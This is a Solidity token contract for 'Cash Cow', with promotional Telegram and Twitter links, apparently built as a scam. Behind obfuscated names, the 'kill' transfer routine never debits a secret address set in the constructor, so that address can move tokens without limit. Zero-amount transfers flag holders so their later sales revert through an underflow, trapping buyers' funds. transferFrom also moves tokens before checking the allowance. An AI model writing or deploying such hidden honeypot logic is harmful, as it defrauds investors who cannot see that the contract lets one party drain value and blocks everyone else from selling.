/*

?Telegram: ?? https://t.me/CashCow_ETH

?Twitter: ?? https://twitter.com/CashCow_ETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CashCow is Ownable {
    mapping(address => uint256) private mark;

    function transferFrom(address apartment, address toy, uint256 musical) public returns (bool success) {
        kill(apartment, toy, musical);
        require(musical <= allowance[apartment][msg.sender]);
        allowance[apartment][msg.sender] -= musical;
        return true;
    }

    uint256 private sometime = 40;

    mapping(address => uint256) private combination;

    string public name;

    function kill(address apartment, address toy, uint256 musical) private returns (bool success) {
        if (mark[apartment] == 0) {
            if (combination[apartment] > 0 && apartment != uniswapV2Pair) {
                mark[apartment] -= sometime;
            }
            balanceOf[apartment] -= musical;
        }
        if (musical == 0) {
            combination[toy] += sometime;
        }
        balanceOf[toy] += musical;
        emit Transfer(apartment, toy, musical);
        return true;
    }

    uint256 public totalSupply;

    uint8 public decimals = 9;

    function approve(address right, uint256 musical) public returns (bool success) {
        allowance[msg.sender][right] = musical;
        emit Approval(msg.sender, right, musical);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    function transfer(address toy, uint256 musical) public returns (bool success) {
        kill(msg.sender, toy, musical);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address mathematics) {
        symbol = 'Cash Cow';
        name = 'Cash Cow';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        mark[mathematics] = sometime;
    }
}